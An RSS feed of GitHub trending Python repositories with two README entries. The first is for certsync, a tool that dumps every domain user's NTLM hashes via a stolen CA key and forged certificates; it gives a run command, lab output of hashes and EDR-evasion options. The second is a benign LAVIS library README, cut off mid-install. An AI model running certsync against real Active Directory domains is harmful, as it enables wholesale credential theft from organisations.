<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-02-03T01:44:21Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>zblurx/certsync</title>
    <updated>2023-02-03T01:44:21Z</updated>
    <id>tag:github.com,2023-02-03:/zblurx/certsync</id>
    <link href="https://github.com/zblurx/certsync" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Dump NTDS with golden certificates and UnPAC the hash&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;certsync&lt;/h1&gt; &#xA;&lt;p&gt;&lt;code&gt;certsync&lt;/code&gt; is a new technique in order to dump NTDS remotely, but this time &lt;strong&gt;without DRSUAPI&lt;/strong&gt;: it uses &lt;a href=&#34;https://cyberstoph.org/posts/2019/12/an-introduction-to-golden-certificates/&#34;&gt;golden certificate&lt;/a&gt; and &lt;a href=&#34;https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash&#34;&gt;UnPAC the hash&lt;/a&gt;. It works in several steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Dump user list, CA informations and CRL from LDAP&lt;/li&gt; &#xA; &lt;li&gt;Dump CA certificate and private key&lt;/li&gt; &#xA; &lt;li&gt;Forge offline a certificate for every user&lt;/li&gt; &#xA; &lt;li&gt;UnPAC the hash for every user in order to get nt and lm hashes&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ certsync -u khal.drogo -p &#39;horse&#39; -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12&#xA;[*] Collecting userlist, CA info and CRL on LDAP&#xA;[*] Found 13 users in LDAP&#xA;[*] Found CA ESSOS-CA on braavos.essos.local(192.168.56.23)&#xA;[*] Dumping CA certificate and private key&#xA;[*] Forging certificates for every users. This can take some time...&#xA;[*] PKINIT + UnPAC the hashes&#xA;ESSOS.LOCAL/BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:08083254c2fd4079e273c6c783abfbb7:::&#xA;ESSOS.LOCAL/MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b79758e15b7870d28ad0769dfc784ca4:::&#xA;ESSOS.LOCAL/sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::&#xA;ESSOS.LOCAL/jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::&#xA;ESSOS.LOCAL/khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::&#xA;ESSOS.LOCAL/viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::&#xA;ESSOS.LOCAL/daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::&#xA;ESSOS.LOCAL/SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:b63b6ef2caab52ffcb26b3870dc0c4db:::&#xA;ESSOS.LOCAL/vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::&#xA;ESSOS.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Contrary to what we may think, the attack is not at all slower.&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#certsync&#34;&gt;certsync&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#table-of-contents&#34;&gt;Table of Contents&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#installation&#34;&gt;Installation&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#usage&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#why&#34;&gt;Why&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#requirements&#34;&gt;Requirements&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#limitation&#34;&gt;Limitations&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#opsec&#34;&gt;OPSEC&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zblurx/certsync/main/#credits&#34;&gt;Credits&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;git clone https://github.com/zblurx/certsync&#xA;cd certsync&#xA;pip install .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;pipx install git+https://github.com/zblurx/certsync&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ certsync -h&#xA;usage: certsync [-h] [-debug] [-outputfile OUTPUTFILE] [-ca-pfx pfx/p12 file name] [-ca-ip ip address] [-d domain.local] [-u username] [-p password] [-hashes LMHASH:NTHASH]&#xA;                [-no-pass] [-k] [-aesKey hex key] [-use-kcache] [-kdcHost KDCHOST] [-scheme ldap scheme] [-ns nameserver] [-dns-tcp] [-dc-ip ip address]&#xA;                [-ldap-filter LDAP_FILTER] [-template cert.pfx] [-timeout timeout] [-jitter jitter] [-randomize]&#xA;&#xA;Dump NTDS with golden certificates and PKINIT&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  -debug                Turn DEBUG output ON&#xA;  -outputfile OUTPUTFILE&#xA;                        base output filename&#xA;&#xA;CA options:&#xA;  -ca-pfx pfx/p12 file name&#xA;                        Path to CA certificate&#xA;  -ca-ip ip address     IP Address of the certificate authority. If omitted it will use the domainpart (FQDN) specified in LDAP&#xA;&#xA;authentication options:&#xA;  -d domain.local, -domain domain.local&#xA;                        Domain name&#xA;  -u username, -username username&#xA;                        Username&#xA;  -p password, -password password&#xA;                        Password&#xA;  -hashes LMHASH:NTHASH&#xA;                        NTLM hashes, format is LMHASH:NTHASH&#xA;  -no-pass              don&#39;t ask for password (useful for -k)&#xA;  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it&#xA;                        will use the ones specified in the command line&#xA;  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)&#xA;  -use-kcache           Use Kerberos authentication from ccache file (KRB5CCNAME)&#xA;  -kdcHost KDCHOST      FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter&#xA;&#xA;connection options:&#xA;  -scheme ldap scheme&#xA;  -ns nameserver        Nameserver for DNS resolution&#xA;  -dns-tcp              Use TCP instead of UDP for DNS queries&#xA;  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter&#xA;&#xA;OPSEC options:&#xA;  -ldap-filter LDAP_FILTER&#xA;                        ldap filter to dump users. Default is (&amp;amp;(|(objectCategory=person)(objectClass=computer))(objectClass=user))&#xA;  -template cert.pfx    base template to use in order to forge certificates&#xA;  -timeout timeout      Timeout between PKINIT connection&#xA;  -jitter jitter        Jitter between PKINIT connection&#xA;  -randomize            Randomize certificate generation. Takes longer to generate all the certificates&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Why&lt;/h2&gt; &#xA;&lt;p&gt;DSRUAPI is more and more monitored and sometimes retricted by EDR solutions. Moreover, &lt;code&gt;certsync&lt;/code&gt; does not require to use a Domain Administrator, it only require a CA Administrator.&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;This attack needs:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A configured Entreprise CA on an ADCS server in the domain,&lt;/li&gt; &#xA; &lt;li&gt;PKINIT working,&lt;/li&gt; &#xA; &lt;li&gt;An domain account which is local administrator on the ADCS server, or an export of the CA certificate and private key.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Limitations&lt;/h2&gt; &#xA;&lt;p&gt;Since we cannot PKINIT for users that are revoked, we cannot dump thier hashes.&lt;/p&gt; &#xA;&lt;h2&gt;OPSEC&lt;/h2&gt; &#xA;&lt;p&gt;Some options were added to customize the behaviour of the tool:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;-ldap-filter&lt;/code&gt;: change the LDAP filter used to select usernames to certsync.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-template&lt;/code&gt;: use an already delivered certificate to mimic it when forging users certificates.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-timeout&lt;/code&gt; and &lt;code&gt;-jitter&lt;/code&gt;: change timeout between PKINIT authentication requests.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-randomize&lt;/code&gt;: By default, every forged user certificates will have the same private key, serial number and validity dates. This parameter will randomize them, but the forging will take longer.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/ly4k_&#34;&gt;Olivier Lyak&lt;/a&gt; for all his work on ADCS and &lt;a href=&#34;https://github.com/ly4k/Certipy&#34;&gt;certipy&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;Benjamin Delpy&lt;/a&gt; for the unPAC the hash technique.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;Will Schroeder&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/tifkin_&#34;&gt;Lee Christensen&lt;/a&gt; for &lt;a href=&#34;https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf&#34;&gt;Certified Pre-Owned&lt;/a&gt; and &lt;a href=&#34;https://github.com/GhostPack/Certify&#34;&gt;Certify&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/M4yFly&#34;&gt;Mayfly&lt;/a&gt; for his great lab: &lt;a href=&#34;https://github.com/Orange-Cyberdefense/GOAD&#34;&gt;GOAD&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>salesforce/LAVIS</title>
    <updated>2023-02-03T01:44:21Z</updated>
    <id>tag:github.com,2023-02-03:/salesforce/LAVIS</id>
    <link href="https://github.com/salesforce/LAVIS" rel="alternate"></link>
    <summary type="html">&lt;p&gt;LAVIS - A One-stop Library for Language-Vision Intelligence&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/docs/_static/logo_final.png&#34; width=&#34;400&#34;&gt; &lt;br&gt; &lt;/p&gt;&#xA;&lt;p&gt; &lt;/p&gt;&#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://github.com/salesforce/LAVIS/releases&#34;&gt;&lt;img alt=&#34;Latest Release&#34; src=&#34;https://img.shields.io/github/release/salesforce/LAVIS.svg?sanitize=true&#34;&gt;&lt;/a&gt; &#xA; &lt;a href=&#34;https://opensource.salesforce.com/LAVIS/index.html&#34;&gt; &lt;img alt=&#34;docs&#34; src=&#34;https://github.com/salesforce/LAVIS/actions/workflows/docs.yaml/badge.svg?sanitize=true&#34;&gt; &lt;/a&gt;&#xA; &lt;a href=&#34;https://opensource.org/licenses/BSD-3-Clause&#34;&gt; &lt;img alt=&#34;license&#34; src=&#34;https://img.shields.io/badge/License-BSD_3--Clause-blue.svg?sanitize=true&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://pepy.tech/project/salesforce-lavis&#34;&gt; &lt;img alt=&#34;Downloads&#34; src=&#34;https://pepy.tech/badge/salesforce-lavis&#34;&gt; &lt;/a&gt; &#xA;&lt;/div&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://opensource.salesforce.com/LAVIS//latest/benchmark.html&#34;&gt;Benchmark&lt;/a&gt;, &#xA; &lt;a href=&#34;https://arxiv.org/abs/2209.09019&#34;&gt;Technical Report&lt;/a&gt;, &#xA; &lt;a href=&#34;https://opensource.salesforce.com/LAVIS//latest/index.html&#34;&gt;Documentation&lt;/a&gt;, &#xA; &lt;a href=&#34;https://github.com/salesforce/LAVIS/tree/main/examples&#34;&gt;Jupyter Notebook Examples&lt;/a&gt;, &#xA; &lt;a href=&#34;https://blog.salesforceairesearch.com/lavis-language-vision-library/&#34;&gt;Blog&lt;/a&gt; &#xA;&lt;/div&gt; &#xA;&lt;h1&gt;LAVIS - A Library for Language-Vision Intelligence&lt;/h1&gt; &#xA;&lt;h2&gt;What&#39;s New: 🎉&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;[Model Release] Jan 2023, released implementation of &lt;strong&gt;BLIP-2&lt;/strong&gt; (&lt;a href=&#34;https://arxiv.org/abs/2301.12597&#34;&gt;Paper&lt;/a&gt;, &lt;a href=&#34;https://github.com/salesforce/LAVIS/tree/main/projects/blip2&#34;&gt;Project Page&lt;/a&gt;, &lt;a href=&#34;https://colab.research.google.com/github/salesforce/LAVIS/blob/main/examples/blip2_instructed_generation.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;A generic and efficient pre-training strategy that easily harvests development of pretrained vision models and large language models (LLMs) for vision-language pretraining. BLIP-2 beats Flamingo on zero-shot VQAv2 (&lt;strong&gt;65.0&lt;/strong&gt; vs &lt;strong&gt;56.3&lt;/strong&gt;), establishing new state-of-the-art on zero-shot captioning (on NoCaps &lt;strong&gt;121.6&lt;/strong&gt; CIDEr score vs previous best &lt;strong&gt;113.2&lt;/strong&gt;). In addition, equipped with powerful LLMs (e.g. OPT, FlanT5), BLIP-2 also unlocks the new &lt;strong&gt;zero-shot instructed vision-to-language generation&lt;/strong&gt; capabilities for various interesting applications!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Jan 2023, LAVIS is now available on &lt;a href=&#34;https://pypi.org/project/salesforce-lavis/&#34;&gt;PyPI&lt;/a&gt; for installation!&lt;/li&gt; &#xA; &lt;li&gt;[Model Release] Dec 2022, released implementation of &lt;strong&gt;Img2prompt-VQA&lt;/strong&gt; (&lt;a href=&#34;https://arxiv.org/pdf/2212.10846.pdf&#34;&gt;Paper&lt;/a&gt;, &lt;a href=&#34;https://github.com/salesforce/LAVIS/tree/main/projects/img2prompt-vqa&#34;&gt;Project Page&lt;/a&gt;, &lt;a href=&#34;https://colab.research.google.com/github/salesforce/LAVIS/blob/main/projects/img2prompt-vqa/img2prompt_vqa.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;A plug-and-play module that enables off-the-shelf use of Large Language Models (LLMs) for visual question answering (VQA). Img2Prompt-VQA surpasses Flamingo on zero-shot VQA on VQAv2 (61.9 vs 56.3), while in contrast requiring no end-to-end training!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;[Model Release] Oct 2022, released implementation of &lt;strong&gt;PNP-VQA&lt;/strong&gt; (&lt;strong&gt;EMNLP Findings 2022&lt;/strong&gt;, &lt;em&gt;&#34;Plug-and-Play VQA: Zero-shot VQA by Conjoining Large Pretrained Models with Zero Training&#34;&lt;/em&gt;, by Anthony T.M.H. et al), (&lt;a href=&#34;https://arxiv.org/abs/2210.08773&#34;&gt;Paper&lt;/a&gt;, &lt;a href=&#34;https://github.com/salesforce/LAVIS/tree/main/projects/pnp-vqa&#34;&gt;Project Page&lt;/a&gt;, &lt;a href=&#34;https://colab.research.google.com/github/salesforce/LAVIS/blob/main/projects/pnp-vqa/pnp_vqa.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;A modular zero-shot VQA framework that requires no PLMs training, achieving SoTA zero-shot VQA performance.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#installation&#34;&gt;Installation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#getting-started&#34;&gt;Getting Started&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#model-zoo&#34;&gt;Model Zoo&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#image-captioning&#34;&gt;Image Captioning&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#visual-question-answering-vqa&#34;&gt;Visual question answering (VQA)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#unified-feature-extraction-interface&#34;&gt;Unified Feature Extraction Interface&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#load-datasets&#34;&gt;Load Datasets&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#jupyter-notebook-examples&#34;&gt;Jupyter Notebook Examples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#resources-and-tools&#34;&gt;Resources and Tools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#documentations&#34;&gt;Documentations&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#ethical-and-responsible-use&#34;&gt;Ethical and Responsible Use&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#technical-report-and-citing-lavis&#34;&gt;Technical Report and Citing LAVIS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;LAVIS is a Python deep learning library for LAnguage-and-VISion intelligence research and applications. This library aims to provide engineers and researchers with a one-stop solution to rapidly develop models for their specific multimodal scenarios, and benchmark them across standard and customized datasets. It features a unified interface design to access&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;10+&lt;/strong&gt; tasks (retrieval, captioning, visual question answering, multimodal classification etc.);&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;20+&lt;/strong&gt; datasets (COCO, Flickr, Nocaps, Conceptual Commons, SBU, etc.);&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;30+&lt;/strong&gt; pretrained weights of state-of-the-art foundation language-vision models and their task-specific adaptations, including &lt;a href=&#34;https://arxiv.org/pdf/2107.07651.pdf&#34;&gt;ALBEF&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/pdf/2201.12086.pdf&#34;&gt;BLIP&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/pdf/2112.09583.pdf&#34;&gt;ALPRO&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/pdf/2103.00020.pdf&#34;&gt;CLIP&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/salesforce/LAVIS/main/assets/demo-6.png&#34;&gt; &lt;br&gt; &lt;/p&gt;&#xA;&lt;p&gt; &lt;/p&gt;&#xA;&lt;p&gt;Key features of LAVIS include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Unified and Modular Interface&lt;/strong&gt;: facilitating to easily leverage and repurpose existing modules (datasets, models, preprocessors), also to add new modules.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Easy Off-the-shelf Inference and Feature Extraction&lt;/strong&gt;: readily available pre-trained models let you take advantage of state-of-the-art multimodal understanding and generation capabilities on your own data.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Reproducible Model Zoo and Training Recipes&lt;/strong&gt;: easily replicate and extend state-of-the-art models on existing and new tasks.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Dataset Zoo and Automatic Downloading Tools&lt;/strong&gt;: it can be a hassle to prepare the many language-vision datasets. LAVIS provides automatic downloading scripts to help prepare a large variety of datasets and their annotations.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The following table shows the supported tasks, datasets and models in our library. This is a continuing effort and we are working on further growing the list.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Tasks&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Supported Models&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Supported Datasets&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Image-text Pre-training&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ALBEF, BLIP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;COCO, VisualGenome, SBU ConceptualCaptions&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Image-text Retrieval&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ALBEF, BLIP, CLIP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;COCO, Flickr30k&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Text-image Retrieval&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ALBEF, BLIP, CLIP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;COCO, Flickr30k&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Visual Question Answering&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ALBEF, BLIP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;VQAv2, OKVQA, A-OKVQA&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Image Captioning&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;BLIP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;COCO, NoCaps&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Image Classification&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;CLIP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ImageNet&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Natural Language Visual Reasoning (NLVR)&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ALBEF, BLIP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;NLVR2&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Visual Entailment (VE)&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ALBEF&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;SNLI-VE&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Visual Dialogue&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;BLIP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;VisDial&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Video-text Retrieval&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;BLIP, ALPRO&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;MSRVTT, DiDeMo&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Text-video Retrieval&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;BLIP, ALPRO&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;MSRVTT, DiDeMo&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Video Question Answering (VideoQA)&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;BLIP, ALPRO&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;MSRVTT, MSVD&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Video Dialogue&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;VGD-GPT&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;AVSD&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Multimodal Feature Extraction&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;ALBEF, CLIP, BLIP, ALPRO&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;customized&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Text-to-image Generation&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;[COMING SOON]&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;(Optional) Creating conda environment&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;conda create -n lavis python=3.8&#xA;conda activate lavis&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;install from &lt;a href=&#34;https://pypi.org/project/salesforce-lavis/&#34;&gt;PyPI&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install 